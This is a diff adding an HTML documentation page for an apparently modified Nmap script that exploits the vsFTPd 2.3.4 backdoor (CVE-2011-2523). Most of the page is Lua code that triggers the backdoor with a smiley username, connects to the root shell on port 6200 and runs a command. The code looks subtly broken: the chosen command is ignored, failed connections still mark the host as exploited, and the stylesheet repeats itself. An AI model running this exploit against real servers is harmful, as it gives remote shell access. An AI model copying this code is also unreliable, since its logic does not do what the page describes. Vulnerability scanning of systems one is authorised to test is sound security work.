@@ -1,0 +1,181 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<title>ftp-vsftpd-backdoor NSE script &mdash; Nmap Scripting Engine documentation</title>
+<meta name="description" content="How to use the ftp-vsftpd-backdoor NSE script: examples, script-args, and references.">
+
+<link rel="stylesheet" href="../luadoc.css" type="text/css">
+<script async src="../luadoc.js"></script>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="theme-color" content="#2A0D45">
+
+
+<!--END Google Analytics Code-->
+<META NAME="ROBOTS" CONTENT="NOARCHIVE">
+  <style>
+    body {
+    background-color: #2a0d45;
+    min-width: 300px;
+    width: auto !important;
+    width: 300px;
+}
+body, div, img, table, thead, th, tbody, tr, td {
+    margin: 0px;
+    padding: 0px;
+}
+*, *:before, *:after {
+    box-sizing: border-box;
+}
+body {
+    display: block;
+    margin: 20px;
+}
+*, *:before, *:after {
+    box-sizing: border-box;
+}
+*, *:before, *:after {
+    box-sizing: border-box;
+}
+    #nse-content {
+    background-color: white;
+    overflow-wrap: anywhere;
+}
+body, div, img, table, thead, th, tbody, tr, td {
+    margin: 20px 40px;
+    padding: 20px;
+}
+*, *:before, *:after {
+    box-sizing: border-box;
+}
+
+div {
+    display: block;
+}
+#nse-main {
+    font-family: arial, helvetica, geneva, sans-serif;
+    margin: 0px 50px;
+}
+*, *:before, *:after {
+    box-sizing: border-box;
+}
+*, *:before, *:after {
+    box-sizing: border-box;
+}
+  </style>
+
+</head>
+<body>
+    <div id="nst-wrapper">
+
+
+<main id="nst-content">
+<div id="nse-content">
+
+<center><h1><img src="sitelogo.png" alt=""> </h1><h1>NMAP Scripting engine <br>
+  <code>ftp-vsftpd-backdoor</code></h1>
+</center>
+
+<h2 id="summary">Script Summary</h2>
+<p>
+Tests for the presence of the vsFTPd 2.3.4 backdoor reported on 2011-07-04
+(CVE-2011-2523). This script attempts to exploit the backdoor using the
+innocuous <code>id</code> command by default, but that can be changed with
+the <code>exploit.cmd</code> or <code>ftp-vsftpd-backdoor.cmd</code> script
+arguments.
+</p>
+
+
+
+<h2 id="usage">Script</h2>
+
+  <pre>local ftp = require "ftp"
+    local nmap = require "nmap"
+    local shortport = require "shortport"
+    local stdnse = require "stdnse"
+    local string = require "string"
+    local table = require "table"
+    local vulns = require "vulns"
+    categories = {"exploit", "intrusive", "malware", "vuln"}
+    local CMD_FTP = "USER X:)\r\nPASS X\r\n"
+    local CMD_SHELL_ID = "id"
+    portrule = function (host, port)
+      if port.version.product ~= nil and port.version.product ~= "vsftpd" then
+        return false
+      end
+      if port.version.version ~= nil and port.version.version ~= "2.3.4" then
+        return false
+      end
+      return shortport.port_or_service(21, "ftp")(host, port)
+    end
+    local function finish_ftp(socket, status, message)
+      if socket then
+        socket:close()
+      end
+      return status, message
+    end
+    local function check_backdoor(host, shell_cmd, vuln)
+      local socket = nmap.new_socket("tcp")
+      socket:set_timeout(10000)
+      local status, ret = socket:connect(host, 6200, "tcp")
+      if not status then
+        return finish_ftp(socket, false, "can't connect to tcp port 6200")
+      end
+      status, ret = socket:send(CMD_SHELL_ID.."\n")
+      status, ret = socket:receive_lines(1)
+      vuln.state = vulns.STATE.EXPLOIT
+      local result = string.gsub(ret, "^%s*(.-)\n*$", "%1")
+      table.insert(vuln.exploit_results,
+        string.format("Results: %s", result))
+      socket:send("exit\n");
+      return finish_ftp(socket, true)
+    end
+    action = function(host, port)
+      local cmd = stdnse.get_script_args("ftp-vsftpd-backdoor.cmd") or
+      stdnse.get_script_args("exploit.cmd") or CMD_SHELL_ID
+      local vsftp_vuln = {
+        title = "vsFTPd version 2.3.4 backdoor",
+        IDS = {CVE = 'CVE-2011-2523', BID = '48539'},
+          exploit_results = {},
+      }
+      local report = vulns.Report:new(SCRIPT_NAME, host, port)
+      local status, ret = check_backdoor(host, cmd, vsftp_vuln)
+      local sock, code, message, buffer = ftp.connect(host, port,
+        {request_timeout = 8000})
+      status, ret = sock:send(CMD_FTP .. "\r\n")
+      stdnse.sleep(1)  
+      status, ret = check_backdoor(host, cmd, vsftp_vuln)
+      sock:close()
+      return report:make_output(vsftp_vuln)
+    end
+    
+</pre>
+
+
+
+  <h2 id="output"> Script Output </h2>
+<img src="Screenshot (55).png" alt="">
+
+
+
+ 
+
+<hr/>
+
+
+<p><b>Author:</b>
+<ul class="authors_list">
+<li>sudhan
+
+</ul>
+
+
+
+
+
+</div> <!-- id="nse-content" -->
+</div> <!-- id="nse-main" -->
+</body>
+</html>
+
+
